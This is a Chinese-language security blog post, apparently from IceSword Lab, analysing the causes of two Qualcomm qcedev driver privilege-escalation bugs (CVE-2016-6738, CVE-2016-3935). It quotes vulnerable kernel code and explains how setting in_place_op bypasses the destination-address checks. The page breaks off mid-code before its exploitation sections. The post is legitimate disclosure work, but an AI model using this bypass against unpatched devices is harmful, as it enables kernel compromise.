<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
<!-- Google Analytics -->
<script type="text/javascript">
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-114832940-2', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  
  <title>高通加解密引擎提权漏洞解析 | IceSword Lab</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="author : jiayy(@chengjia4574)  from  IceSword Lab , Qihoo 360    前言 背景知识 漏洞成因 CVE-2016-6738 漏洞成因 CVE-2016-6738 漏洞补丁 CVE-2016-3935 漏洞成因 CVE-2016-3935 漏洞补丁   漏洞利用 什么是提权 利用方法回顾 本文使用的方法 CVE-2016-6738 漏洞利用">
<meta property="og:type" content="article">
<meta property="og:title" content="高通加解密引擎提权漏洞解析">
<meta property="og:url" content="http://yoursite.com/2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/index.html">
<meta property="og:site_name" content="IceSword Lab">
<meta property="og:description" content="author : jiayy(@chengjia4574)  from  IceSword Lab , Qihoo 360    前言 背景知识 漏洞成因 CVE-2016-6738 漏洞成因 CVE-2016-6738 漏洞补丁 CVE-2016-3935 漏洞成因 CVE-2016-3935 漏洞补丁   漏洞利用 什么是提权 利用方法回顾 本文使用的方法 CVE-2016-6738 漏洞利用">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/3935patch.png">
<meta property="og:image" content="http://yoursite.com/2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/exphistory.png">
<meta property="og:image" content="https://npercoco.typepad.com/.a/6a0133f264aa62970b01b7c86b399a970b-800wi">
<meta property="article:published_time" content="2017-08-07T00:00:00.000Z">
<meta property="article:modified_time" content="2025-07-16T10:02:19.264Z">
<meta property="article:author" content="IceSword Lab">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://yoursite.com/2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/3935patch.png">
  
    <link rel="alternate" href="../../../../atom.xml" title="IceSword Lab" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.ico">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="../../../../css/style.css">

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="../../../../index.html" id="logo">IceSword Lab</a>
      </h1>
      
        <h2 id="subtitle-wrap">
          <a href="../../../../index.html" id="subtitle">Work hard in silence , let success make the noise.</a>
        </h2>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="../../../../index.html">Home</a>
        
          <a class="main-nav-link" href="../../../../archives">Archives</a>
        
          <a class="main-nav-link" href="../../../../research">Research</a>
        
          <a class="main-nav-link" href="../../../../vulnerabilities">Vulnerabilities</a>
        
          <a class="main-nav-link" href="../../../../recruitment">Recruitment</a>
        
          <a class="main-nav-link" href="../../../../about">About</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="../../../../atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="" class="article-date">
  <time datetime="2017-08-07T00:00:00.000Z" itemprop="datePublished">2017-08-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      高通加解密引擎提权漏洞解析
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author : <a href="https://twitter.comengjia4574" target="_blank">jiayy(@chengjia4574)</a>  from  IceSword Lab , Qihoo 360</p>
<hr>
<p><span id="top"></span></p>
<ul>
<li><a href="#before">前言</a></li>
<li><a href="#backgroud">背景知识</a></li>
<li><a href="#cause">漏洞成因</a><ul>
<li><a href="#CVE-2016-6738-cause">CVE-2016-6738 漏洞成因</a></li>
<li><a href="#CVE-2016-6738-patch">CVE-2016-6738 漏洞补丁</a></li>
<li><a href="#CVE-2016-3935-cause">CVE-2016-3935 漏洞成因</a></li>
<li><a href="#CVE-2016-3935-patch">CVE-2016-3935 漏洞补丁</a></li>
</ul>
</li>
<li><a href="#exp">漏洞利用</a><ul>
<li><a href="#what-is-kernel-exp">什么是提权</a></li>
<li><a href="#android-kernel-exp">利用方法回顾</a></li>
<li><a href="#this-kernel-exp">本文使用的方法</a></li>
<li><a href="#CVE-2016-6738-exp">CVE-2016-6738 漏洞利用</a></li>
<li><a href="#CVE-2016-3935-exp">CVE-2016-3935 漏洞利用</a></li>
</ul>
</li>
<li><a href="#refer">参考</a></li>
</ul>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言 [^]"></a>前言 <a href="#top">[^]</a></h2><p><span id="before"></span><br>CVE-2016-3935 和 CVE-2016-6738 是<a href="http://www.iceswordlab.com/" target="_blank" rel="noopener">我们</a>发现的高通加解密引擎（Qualcomm crypto engine）的两个提权漏洞，分别在2016年<a href="https://source.android.com/security/bulletin/2016-10-01" target="_blank" rel="noopener">10月</a>和<a href="https://source.android.com/security/bulletin/2016-11-01" target="_blank" rel="noopener">11月</a>的谷歌android漏洞榜被公开致谢，同时高通也在2016年<a href="https://www.codeaurora.org/failed-integer-overflow-check-leads-heap-overflow-driver-devqce-cve-2016-3901-cve-2016-3935" target="_blank" rel="noopener">10月</a>和<a href="https://www.codeaurora.org/user-controlled-arbitrary-kernel-address-write-qcedev-driver-cve-2016-6738" target="_blank" rel="noopener">11月</a>的漏洞公告里进行了介绍和公开致谢。这两个漏洞报告给谷歌的时候都提交了exploit并且被采纳，这篇文章介绍一下这两个漏洞的成因和利用。</p>
<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识 [^]"></a>背景知识 <a href="#top">[^]</a></h2><p><span id="backgroud"></span></p>
<p>高通芯片提供了硬件加解密功能，并提供驱动给内核态和用户态程序提供高速加解密服务，我们在这里收获了多个漏洞，主要有3个驱动</p>
<pre><code>- qcrypto driver:  供内核态程序使用的加解密接口 
- qcedev driver: 供用户态程序使用的加解密接口
- qce driver:  与加解密芯片交互，提供加解密驱动底层接口</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Documentation/crypto/msm/qce.txt</span><br><span class="line"></span><br><span class="line">  Linux kernel</span><br><span class="line">  (ex:IPSec)&lt;--*Qualcomm crypto driver----+</span><br><span class="line">                        (qcrypto)         |</span><br><span class="line">                   (<span class="keyword">for</span> kernel space app) |</span><br><span class="line">                                          |</span><br><span class="line">                                          +--&gt;|</span><br><span class="line">                                              |</span><br><span class="line">                                              | *qce   &lt;----&gt; Qualcomm</span><br><span class="line">                                              | driver        ADM driver &lt;---&gt; ADM HW</span><br><span class="line">                                          +--&gt;|                 |               |</span><br><span class="line">                                          |                     |               |</span><br><span class="line">                                          |                     |               |</span><br><span class="line">                                          |                     |               |</span><br><span class="line">   Linux kernel                           |                     |               |</span><br><span class="line">   misc device  &lt;--- *QCEDEV Driver-------+                     |               |</span><br><span class="line">   interface             (qcedev)                       (Reg interface)  (DMA interface)</span><br><span class="line">                        (<span class="keyword">for</span> user space app)                    \               /</span><br><span class="line">                                                                 \             /</span><br><span class="line">                                                                  \           /</span><br><span class="line">                                                                   \         /</span><br><span class="line">                                                                    \       /</span><br><span class="line">                                                                     \     /</span><br><span class="line">                                                                      \   /</span><br><span class="line">                                                                Qualcomm crypto CE3 HW</span><br></pre></td></tr></table></figure>

<p><a href="https://android.googlesource.com/kernel/msm.git/+/3f2bc4d6eb5a4fada842462ba22bb6bbb41d00c7/Documentation/crypto/msm/qcedev.txt" target="_blank" rel="noopener">qcedev driver</a> 就是本文两个漏洞发生的地方，这个驱动通过 ioctl 接口为用户层提供加解密和哈希运算服务。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Documentation/crypto/msm/qcedev.txt</span><br><span class="line"></span><br><span class="line">Cipher IOCTLs:</span><br><span class="line">  --------------</span><br><span class="line">    QCEDEV_IOCTL_ENC_REQ is <span class="keyword">for</span> encrypting data.</span><br><span class="line">    QCEDEV_IOCTL_DEC_REQ is <span class="keyword">for</span> decrypting data.</span><br><span class="line"></span><br><span class="line">        The <span class="built_in">caller</span> of the IOCTL passes a pointer to the structure shown</span><br><span class="line">        below, as the second parameter.</span><br><span class="line"></span><br><span class="line">        struct  qcedev_cipher_op_req &#123;</span><br><span class="line">                int                             use_pmem;</span><br><span class="line">                union&#123;</span><br><span class="line">                        struct qcedev_pmem_info pmem;</span><br><span class="line">                        struct qcedev_vbuf_info vbuf;</span><br><span class="line">                &#125;;</span><br><span class="line">                uint32_t                        entries;</span><br><span class="line">                uint32_t                        data_len;</span><br><span class="line">                uint8_t                         in_place_op;</span><br><span class="line">                uint8_t                         enckey[QCEDEV_MAX_KEY_SIZE];</span><br><span class="line">                uint32_t                        encklen;</span><br><span class="line">                uint8_t                         iv[QCEDEV_MAX_IV_SIZE];</span><br><span class="line">                uint32_t                        ivlen;</span><br><span class="line">                uint32_t                        byteoffset;</span><br><span class="line">                enum qcedev_cipher_alg_enum     alg;</span><br><span class="line">                enum qcedev_cipher_mode_enum    mode;</span><br><span class="line">                enum qcedev_oper_enum           op;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<p>加解密服务的核心结构体是 struct  qcedev_cipher_op_req, 其中, 待加/解密数据存放在 vbuf 变量里，enckey 是秘钥， alg 是算法，这个结构将控制内核qce引擎的加解密行为。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Documentation/crypto/msm/qcedev.txt</span><br><span class="line"></span><br><span class="line"> Hashing/HMAC IOCTLs</span><br><span class="line">  -------------------</span><br><span class="line"></span><br><span class="line">    QCEDEV_IOCTL_SHA_INIT_REQ is <span class="keyword">for</span> initializing a <span class="built_in">hash</span>/hmac request.</span><br><span class="line">    QCEDEV_IOCTL_SHA_UPDATE_REQ is <span class="keyword">for</span> updating <span class="built_in">hash</span>/hmac.</span><br><span class="line">    QCEDEV_IOCTL_SHA_FINAL_REQ is <span class="keyword">for</span> ending the <span class="built_in">hash</span>/mac request.</span><br><span class="line">    QCEDEV_IOCTL_GET_SHA_REQ is <span class="keyword">for</span> retrieving the <span class="built_in">hash</span>/hmac <span class="keyword">for</span> data</span><br><span class="line">        packet of known size.</span><br><span class="line">    QCEDEV_IOCTL_GET_CMAC_REQ is <span class="keyword">for</span> retrieving the MAC (using AES CMAC</span><br><span class="line">        algorithm) <span class="keyword">for</span> data packet of known size.</span><br><span class="line"></span><br><span class="line">        The <span class="built_in">caller</span> of the IOCTL passes a pointer to the structure shown</span><br><span class="line">        below, as the second parameter.</span><br><span class="line"></span><br><span class="line">        struct  qcedev_sha_op_req &#123;</span><br><span class="line">                struct buf_info                 data[QCEDEV_MAX_BUFFERS];</span><br><span class="line">                uint32_t                        entries;</span><br><span class="line">                uint32_t                        data_len;</span><br><span class="line">                uint8_t                         digest[QCEDEV_MAX_SHA_DIGEST];</span><br><span class="line">                uint32_t                        diglen;</span><br><span class="line">                uint8_t                         *authkey;</span><br><span class="line">                uint32_t                        authklen;</span><br><span class="line">                enum qcedev_sha_alg_enum        alg;</span><br><span class="line">                struct qcedev_sha_ctxt          ctxt;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>

<p>哈希运算服务的核心结构体是 struct qcedev_sha_op_req, 待处理数据存放在 data 数组里，entries 是待处理数据的份数，data_len 是总长度。</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因 [^]"></a>漏洞成因 <a href="#top">[^]</a></h2><p><span id="cause"></span> </p>
<p>可以通过下面的方法获取本文的漏洞代码</p>
<pre><code>* git clone https://android.googlesource.com/kernel/msm.git
* git checkout android-msm-angler-3.10-nougat-mr2
* git checkout 6cc52967be8335c6f53180e30907f405504ce3dd drivers/crypto/msm/qcedev.c </code></pre><h3 id="CVE-2016-6738-漏洞成因"><a href="#CVE-2016-6738-漏洞成因" class="headerlink" title="CVE-2016-6738 漏洞成因 [^]"></a>CVE-2016-6738 漏洞成因 <a href="#top">[^]</a></h3><p><span id="CVE-2016-6738-cause"></span></p>
<p>现在，我们来看第一个漏洞 cve-2016-6738</p>
<p>介绍漏洞之前，先科普一下linux kernel 的两个小知识点</p>
<p>1) linux kernel 的用户态空间和内核态空间是怎么划分的？</p>
<p>简单来说，在一个进程的地址空间里，比 thread_info-&gt;addr_limit 大的属于内核态地址，比它小的属于用户态地址</p>
<p>2) linux kernel 用户态和内核态之间数据怎么传输？</p>
<p>不可以直接赋值或拷贝，需要使用规定的接口进行数据拷贝，主要是4个接口：</p>
<p><code>copy_from_user/copy_to_user/get_user/put_user</code></p>
<p>这4个接口会对目标地址进行合法性校验，比如：</p>
<p><code>copy_to_user =  access_ok + __copy_to_user</code>   // __copy_to_user 可以理解为是memcpy</p>
<p>下面看漏洞代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">file: drivers/crypto/msm/qcedev.c</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">qcedev_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> QCEDEV_IOCTL_ENC_REQ:</span><br><span class="line">        <span class="keyword">case</span> QCEDEV_IOCTL_DEC_REQ:</span><br><span class="line">                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE, (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                <span class="keyword">sizeof</span>(struct qcedev_cipher_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (__copy_from_user(&amp;qcedev_areq.cipher_op_req,</span><br><span class="line">                                (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                <span class="keyword">sizeof</span>(struct qcedev_cipher_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                qcedev_areq.op_type = QCEDEV_CRYPTO_OPER_CIPHER;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (qcedev_check_cipher_params(&amp;qcedev_areq.cipher_op_req,</span><br><span class="line">                                podev))</span><br><span class="line">                        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">                err = qcedev_vbuf_ablk_cipher(&amp;qcedev_areq, handle);</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                        <span class="keyword">return</span> err;</span><br><span class="line">                <span class="keyword">if</span> (__copy_to_user((<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                        &amp;qcedev_areq.cipher_op_req,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(struct qcedev_cipher_op_req)))</span><br><span class="line">                                <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err:</span><br><span class="line">        debugfs_remove_recursive(_debug_dent);</span><br><span class="line">        <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当用户态通过 ioctl 函数进入 qcedev 驱动后，如果 command 是 <strong>QCEDEV_IOCTL_ENC_REQ</strong>（加密）或者 <strong>QCEDEV_IOCTL_DEC_REQ</strong>（解密），最后都会调用函数 <strong>qcedev_vbuf_ablk_cipher</strong> 进行处理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">file: drivers/crypto/msm/qcedev.c</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qcedev_vbuf_ablk_cipher</span><span class="params">(struct qcedev_async_req *areq,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                struct qcedev_handle *handle)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="class"><span class="keyword">struct</span>  <span class="title">qcedev_cipher_op_req</span> *<span class="title">creq</span> = &amp;<span class="title">areq</span>-&gt;<span class="title">cipher_op_req</span>;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Verify Source Address's */</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; areq-&gt;cipher_op_req.entries; i++)</span><br><span class="line">                <span class="keyword">if</span> (!access_ok(VERIFY_READ,</span><br><span class="line">                        (<span class="keyword">void</span> __user *)areq-&gt;cipher_op_req.vbuf.src[i].vaddr,</span><br><span class="line">                                        areq-&gt;cipher_op_req.vbuf.src[i].len))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Verify Destination Address's */</span></span><br><span class="line">        <span class="keyword">if</span> (creq-&gt;in_place_op != <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>, total = <span class="number">0</span>; i &lt; QCEDEV_MAX_BUFFERS; i++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((areq-&gt;cipher_op_req.vbuf.dst[i].vaddr != <span class="number">0</span>) &amp;&amp;</span><br><span class="line">                                                (total &lt; creq-&gt;data_len)) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)creq-&gt;vbuf.dst[i].vaddr,</span><br><span class="line">                                                creq-&gt;vbuf.dst[i].len)) &#123;</span><br><span class="line">                                        pr_err(<span class="string">"%s:DST WR_VERIFY err %d=0x%lx\n"</span>,</span><br><span class="line">                                                __func__, i, (<span class="keyword">uintptr_t</span>)</span><br><span class="line">                                                creq-&gt;vbuf.dst[i].vaddr);</span><br><span class="line">                                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                                &#125;</span><br><span class="line">                                total += creq-&gt;vbuf.dst[i].len;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>, total = <span class="number">0</span>; i &lt; creq-&gt;entries; i++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (total &lt; creq-&gt;data_len) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)creq-&gt;vbuf.src[i].vaddr,</span><br><span class="line">                                                creq-&gt;vbuf.src[i].len)) &#123;</span><br><span class="line">                                        pr_err(<span class="string">"%s:SRC WR_VERIFY err %d=0x%lx\n"</span>,</span><br><span class="line">                                                __func__, i, (<span class="keyword">uintptr_t</span>)</span><br><span class="line">                                                creq-&gt;vbuf.src[i].vaddr);</span><br><span class="line">                                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                                &#125;</span><br><span class="line">                                total += creq-&gt;vbuf.src[i].len;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line">        total = <span class="number">0</span>;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (areq-&gt;cipher_op_req.data_len &gt; max_data_xfer) &#123;</span><br><span class="line">...</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">                err = qcedev_vbuf_ablk_cipher_max_xfer(areq, &amp;di, handle,</span><br><span class="line">...                                                             k_align_src);</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 qcedev_vbuf_ablk_cipher 函数里，首先对 creq-&gt;vbuf.src 数组里的地址进行了校验，接下去它需要校验 creq-&gt;vbuf.dst 数组里的地址</p>
<p>这时候我们发现，当变量 <strong>creq-&gt;in_place_op</strong> 的值不等于 1 时，它才会校验 creq-&gt;vbuf.dst 数组里的地址，否则目标地址creq-&gt;vbuf.dst[i].vaddr 将不会被校验</p>
<p>这里的 <strong>creq-&gt;in_place_op</strong> 是一个用户层可以控制的值，如果后续代码对这个值没有要求，那么这里就可以通过让 <strong>creq-&gt;in_place_op = 1</strong> 来绕过对 creq-&gt;vbuf.dst[i].vaddr 的校验，这是一个疑似漏洞</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">file: drivers/crypto/msm/qcedev.c</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qcedev_vbuf_ablk_cipher_max_xfer</span><span class="params">(struct qcedev_async_req *areq,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">int</span> *di, struct qcedev_handle *handle,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">uint8_t</span> *k_align_src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">uint8_t</span> *k_align_dst = k_align_src;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span>  <span class="title">qcedev_cipher_op_req</span> *<span class="title">creq</span> = &amp;<span class="title">areq</span>-&gt;<span class="title">cipher_op_req</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (areq-&gt;cipher_op_req.mode == QCEDEV_AES_MODE_CTR)</span><br><span class="line">                byteoffset = areq-&gt;cipher_op_req.byteoffset;</span><br><span class="line"></span><br><span class="line">        user_src = (<span class="keyword">void</span> __user *)areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].vaddr;</span><br><span class="line">        <span class="keyword">if</span> (user_src &amp;&amp; __copy_from_user((k_align_src + byteoffset),</span><br><span class="line">                                (<span class="keyword">void</span> __user *)user_src,</span><br><span class="line">                                areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].len))</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">        k_align_src += byteoffset + areq-&gt;cipher_op_req.vbuf.src[<span class="number">0</span>].len;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; areq-&gt;cipher_op_req.entries; i++) &#123;</span><br><span class="line">                user_src =</span><br><span class="line">                        (<span class="keyword">void</span> __user *)areq-&gt;cipher_op_req.vbuf.src[i].vaddr;</span><br><span class="line">                <span class="keyword">if</span> (user_src &amp;&amp; __copy_from_user(k_align_src,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)user_src,</span><br><span class="line">                                        areq-&gt;cipher_op_req.vbuf.src[i].len)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                &#125;</span><br><span class="line">                k_align_src += areq-&gt;cipher_op_req.vbuf.src[i].len;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">while</span> (creq-&gt;data_len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (creq-&gt;vbuf.dst[dst_i].len &lt;= creq-&gt;data_len) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (err == <span class="number">0</span> &amp;&amp; __copy_to_user(</span><br><span class="line">                                (<span class="keyword">void</span> __user *)creq-&gt;vbuf.dst[dst_i].vaddr,</span><br><span class="line">                                        (k_align_dst + byteoffset),</span><br><span class="line">                                        creq-&gt;vbuf.dst[dst_i].len))</span><br><span class="line">                                        <span 